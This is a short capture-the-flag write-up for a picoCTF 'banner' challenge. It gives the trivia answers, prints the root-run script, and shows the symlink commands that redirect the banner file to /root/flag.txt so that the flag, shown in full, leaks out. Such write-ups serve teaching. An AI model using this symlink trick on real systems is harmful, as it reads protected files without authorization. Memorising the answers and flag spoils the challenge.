# Solution

What is the password?  
- My_Passw@rd_@1234  
What is the top cyber security conference in the world?  
- DEF CON  
the first hacker ever was known for phreaking(making free phone calls), who was it?  
- ’JOHN DRAPER’/ ‘JOHN THOMAS DRAPER’/ ‘JOHN’/ ‘DRAPER’

```bash
player@challenge:~$ cat /root/script.py  
cat /root/script.py  
  
import os  
import pty  
  
incorrect_ans_reply = "Lol, good try, try again and good luck\n"  
  
if __name__ == "__main__":  
try:  
with open("/home/player/banner", "r") as f:  
print(f.read())  
except:  
print("*********************************************")  
print("***************DEFAULT BANNER****************")  
print("*Please supply banner in /home/player/banner*")  
print("*********************************************")  
  
try:  
request = input("what is the password? \n").upper()  
while request:  
if request == 'MY_PASSW@RD_@1234':  
text = input("What is the top cyber security conference in the world?\n").upper()  
if text == 'DEFCON' or text == 'DEF CON':  
output = input(  
"the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()  
if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':  
scmd = 'su - player'  
pty.spawn(scmd.split(' '))  
  
else:  
print(incorrect_ans_reply)  
else:  
print(incorrect_ans_reply)  
else:  
print(incorrect_ans_reply)  
break  
  
except:  
KeyboardInterrupt
```

```bash
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
```

```bash
╭─[~]─[at0m@heker]─[0]─[5031]
╰─[:)] %  nc tethys.picoctf.net 52724
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}

what is the password? 
```

- Symlinks act as reference pointers to files or directories. We can think of the symlinks as a shortcut to the file like if we link **link1 -> /root/flag.txt**, **calling** **link1** means to **call /root/flag.txt**.

-  `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}`

---
